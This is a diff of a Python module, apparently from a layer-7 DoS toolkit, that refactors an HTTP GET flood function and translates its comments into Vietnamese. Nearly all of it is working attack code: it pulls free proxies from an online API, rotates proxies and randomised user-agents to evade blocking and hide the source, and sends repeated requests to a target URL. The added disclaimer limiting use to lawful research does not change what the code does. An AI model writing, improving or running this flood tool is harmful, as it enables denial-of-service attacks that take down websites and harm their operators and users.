@@ -1,50 +1,68 @@
-"""This module provides the flood function for an HTTP GET request DoS attack through proxies."""
+"""Module cung cấp hàm flood để thực hiện HTTP GET request DoS attack thông qua proxy.
+
+Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
+"""
 
 import json
 import random
 import sys
 import warnings
+import logging
 from typing import Dict, List
 
 import requests
-from colorama import Fore as F
 from requests.exceptions import ConnectionError, Timeout, ProxyError
-from urllib3.exceptions import ProxySchemeUnknown  # Import ProxySchemeUnknown from urllib3
+from urllib3.exceptions import ProxySchemeUnknown
 
-# Ignore warnings for unverified HTTPS requests
+from colorama import Fore as F
+
+# Tắt cảnh báo cho các request HTTPS không xác thực
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
-# Load user agents from a JSON file
-with open("tools/L7/user_agents.json", "r") as agents:
-    user_agents = json.load(agents)["agents"]
+# Cấu hình logging để theo dõi quá trình chạy
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+def load_user_agents(file_path: str = "tools/L7/user_agents.json") -> List[str]:
+    """Load danh sách user-agents từ file JSON."""
+    try:
+        with open(file_path, "r") as agents:
+            data = json.load(agents)
+            return data.get("agents", [])
+    except Exception as e:
+        logging.error("Lỗi khi load user agents: %s", e)
+        return []
+
+user_agents = load_user_agents()
 
 def get_http_proxies() -> List[Dict[str, str]]:
-    """Return a list of available proxies using HTTP protocol.
+    """Lấy danh sách proxies sử dụng giao thức HTTP.
 
     Returns:
-        List[Dict[str, str]]: A list containing dictionaries with http and https proxies.
+        List[Dict[str, str]]: Danh sách các proxy với schema cho http và https.
     """
     try:
-        # Fetch proxy list from the updated ProxyScrape API
-        with requests.get(
+        response = requests.get(
             "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
             verify=False,
-        ) as proxy_list:
-            # Ensure each proxy has schema for both HTTP and HTTPS
-            proxies = [
-                {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-                for proxy in proxy_list.text.split("\n") if proxy
-            ]
-    except Timeout:
-        print(f"\n{F.RED}[!] {F.CYAN}Could not connect to the proxy source!{F.RESET}")
+            timeout=10
+        )
+        response.raise_for_status()
+        # Đảm bảo mỗi proxy đều có schema cho cả HTTP và HTTPS
+        proxies = [
+            {"http": f"http://{proxy.strip()}", "https": f"http://{proxy.strip()}"}
+            for proxy in response.text.splitlines() if proxy.strip()
+        ]
+        return proxies
+    except (Timeout, ConnectionError) as e:
+        logging.error("Không thể kết nối đến nguồn proxy: %s", e)
         sys.exit(1)
-    except ConnectionError:
-        print(f"\n{F.RED}[!] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
+    except Exception as e:
+        logging.error("Lỗi khi lấy proxy: %s", e)
         sys.exit(1)
 
-    return proxies
+proxies = get_http_proxies()
 
-# Default headers for HTTP requests
+# Default headers cho request
 headers = {
     "X-Requested-With": "XMLHttpRequest",
     "Connection": "keep-alive",
@@ -53,48 +71,50 @@ headers = {
     "Accept-Encoding": "gzip, deflate, br",
 }
 
-# Load initial proxy list
-proxies = get_http_proxies()
-# Color code for status printing
+# Màu sắc hiển thị trạng thái (200 -> green, khác -> red)
 color_code = {True: F.GREEN, False: F.RED}
 
 def flood(target: str) -> None:
-    """Start an HTTP GET request flood through proxies.
+    """Thực hiện HTTP GET request flood thông qua proxy.
 
     Args:
-        target (str): Target URL to flood.
-
-    Returns:
-        None
+        target (str): URL mục tiêu flood.
     """
-    global proxies
-    global headers
+    global proxies, headers
 
-    # Randomly choose a user-agent for each request
-    headers["User-agent"] = random.choice(user_agents)
+    # Chọn ngẫu nhiên một user-agent cho mỗi request
+    headers["User-agent"] = random.choice(user_agents) if user_agents else "Mozilla/5.0"
 
     try:
-        # Select a random proxy from the list
+        # Chọn một proxy ngẫu nhiên từ danh sách
         proxy = random.choice(proxies)
-        # Send a GET request with selected proxy and headers
-        response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
-    except (Timeout, OSError, ProxyError, ProxySchemeUnknown):  # Use ProxySchemeUnknown from urllib3
-        # Remove invalid proxy from the list
+    except IndexError:
+        logging.error("Danh sách proxy trống. Tải lại danh sách proxy.")
+        proxies.extend(get_http_proxies())
+        proxy = random.choice(proxies)
+
+    try:
+        response = requests.get(target, headers=headers, proxies=proxy, timeout=4, verify=False)
+    except (Timeout, OSError, ProxyError, ProxySchemeUnknown) as e:
+        logging.warning("Proxy không hợp lệ (%s). Xóa khỏi danh sách. Chi tiết: %s", proxy, e)
         try:
             proxies.remove(proxy)
         except ValueError:
-            # If no proxies remain, reload the proxy list
-            proxies = get_http_proxies()
-    else:
-        # Print request status and data if request is successful
-        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
-        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
-        proxy_addr = f"| {F.RESET}Proxy: {F.CYAN}{proxy['http']:>21}"
-        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+            proxies.extend(get_http_proxies())
+        return
+    except Exception as e:
+        logging.error("Lỗi khi gửi request: %s", e)
+        return
 
-        # Reload proxy list if needed
-        if not response.status_code:
-            try:
-                proxies.remove(proxy)
-            except ValueError:
-                proxies = get_http_proxies()
+    # In thông tin trạng thái của request
+    status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
+    payload_size = f"Requested Data Size: {F.CYAN}{round(len(response.content) / 1024, 2):>6} KB{F.RESET}"
+    proxy_addr = f"Proxy: {F.CYAN}{proxy['http']:>21}{F.RESET}"
+    logging.info("%s --> %s | %s", status, payload_size, proxy_addr)
+
+    # Nếu có lỗi trong response, reload proxy
+    if not response.status_code:
+        try:
+            proxies.remove(proxy)
+        except ValueError:
+            proxies.extend(get_http_proxies())
